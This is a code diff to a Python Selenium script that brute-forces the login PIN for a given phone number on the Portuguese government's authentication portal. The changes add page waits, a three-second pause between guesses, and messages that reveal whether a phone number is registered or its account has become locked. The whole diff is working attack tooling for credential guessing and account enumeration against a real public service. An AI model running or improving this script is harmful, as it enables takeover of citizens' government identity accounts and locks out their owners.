@@ -6,8 +6,12 @@ login.
 
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.common.by import By
 import requests
 from bs4 import BeautifulSoup
+import time
 
 def go_to_login_page(driver):
     driver.get('https://frtend.reg.cmd.autenticacao.gov.pt/Ama.Registry.Frontend/Processes/RegistryOnline/LoginOnline.aspx')
@@ -76,7 +80,7 @@ def parse_form_data_from_HTML(html, phone, pin):
 
     return data
 
-def is_pin_valid(html):
+def is_pin_valid(html, num_attempts):
     WRONG_PIN_TEXT = 'O número de telemóvel ou o PIN estão errados ou registo inexistente'
     bs = BeautifulSoup(html, 'html.parser')
 
@@ -84,6 +88,8 @@ def is_pin_valid(html):
 
     if elem.text == WRONG_PIN_TEXT:
         print('\tWRONG PIN')
+        if num_attempts == 3:
+            print('Phone number is NOT associated with an account!')
         return False
     elif bs.find(id='MainContent_txtMobileTAN') is not None:
         # Second factor auth box found, PIN has been succesfully guessed
@@ -91,6 +97,7 @@ def is_pin_valid(html):
         return True
     elif elem.text.startswith('A sua conta encontra-se temporariamente bloqueada'):
         print('This phone number is registered!')
+        print('The account is now temporarily locked!')
         import pdb; pdb.set_trace()
     else:
         # TODO: your session might've been timed out, all you have to do
@@ -111,16 +118,20 @@ def bruteforce_login(driver, phone_number, pin_list):
     first_pin = pin_list[0]
     pin_list = pin_list[1:]
 
+    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, '__EVENTVALIDATION')))
+
+
     num_attempts += 1
     print('Trying: {}:{} [{}/{}]'.format(phone_number, first_pin, num_attempts, num_pins))
-
     data = parse_form_data_from_HTML(driver.page_source, phone_number, first_pin)
     res = attempt_login(session, data, phone_number, first_pin)
 
-    if (is_pin_valid(res.content)):
+    if (is_pin_valid(res.content, num_attempts)):
         return True
 
     for pin in pin_list:
+        time.sleep(3)
+
         num_attempts += 1
         print('Trying: {}:{} [{}/{}]'.format(phone_number, pin, num_attempts, num_pins))
 
@@ -128,13 +139,14 @@ def bruteforce_login(driver, phone_number, pin_list):
         #import pdb; pdb.set_trace()
         res = attempt_login(session, data, phone_number, pin)
 
-        if is_pin_valid(res.content):
+        if is_pin_valid(res.content, num_attempts):
             return True
 
     print('FAILED to find PIN')
     return False
 
 driver = webdriver.Chrome()
+
 driver.implicitly_wait(10)
 
 go_to_login_page(driver)
